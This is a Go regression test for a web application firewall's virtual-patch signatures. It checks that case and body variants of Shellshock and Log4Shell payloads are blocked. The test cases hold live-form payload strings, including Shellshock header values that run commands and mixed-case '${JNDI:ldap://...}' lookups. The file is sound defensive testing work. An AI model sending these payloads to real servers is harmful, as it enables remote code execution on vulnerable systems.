package virtualpatch

import (
	"net/http/httptest"
	"strings"
	"testing"

	"github.com/guardianwaf/guardianwaf/internal/engine"
)

// Regressions from audit round 80 (evidence:
// .temp_files/ledger_audit80-crs-virtualpatch.md).
//
// F188: VP-SHELLSHOCK-001 matched only the literal "() { :; }", but bash
// accepts any body after the "() {" prefix — the canonical PoC "() { :;};"
// bypassed it.
// F189: VP-LOG4SHELL-001 matched "${jndi:" case-sensitively, but Log4j2
// lower-cases the lookup prefix, so "${JNDI:" bypassed it.
func TestDefaultSignaturesCatchCanonicalVariants(t *testing.T) {
	layer := NewLayer(&Config{Enabled: true, BlockSeverity: []string{"CRITICAL", "HIGH"}})
	run := func(method, body string, hdr map[string]string) engine.Action {
		req := httptest.NewRequest(method, "/", strings.NewReader(body))
		for k, v := range hdr {
			req.Header.Set(k, v)
		}
		ctx := engine.AcquireContext(req, 1, 1<<20)
		defer engine.ReleaseContext(ctx)
		return layer.Process(ctx).Action
	}
	for _, tc := range []struct {
		name, method, body string
		hdr                map[string]string
		want               engine.Action
	}{
		{"shellshock canonical PoC", "GET", "", map[string]string{"User-Agent": "() { :;}; echo x"}, engine.ActionBlock},
		{"shellshock other body", "GET", "", map[string]string{"Referer": "() { _; } >_[$($())] { id; }"}, engine.ActionBlock},
		{"shellshock legacy literal", "GET", "", map[string]string{"User-Agent": "() { :; }; id"}, engine.ActionBlock},
		{"log4shell upper UA", "GET", "", map[string]string{"User-Agent": "${JNDI:ldap://e/a}"}, engine.ActionBlock},
		{"log4shell mixed body", "POST", `{"u":"${JnDi:rmi://e/a}"}`, map[string]string{"Content-Type": "application/json"}, engine.ActionBlock},
		{"benign UA", "GET", "", map[string]string{"User-Agent": "Mozilla/5.0 (X11; Linux) jndi docs"}, engine.ActionPass},
	} {
		if got := run(tc.method, tc.body, tc.hdr); got != tc.want {
			t.Errorf("FAIL %s: action=%v, want %v", tc.name, got, tc.want)
		}
	}
}
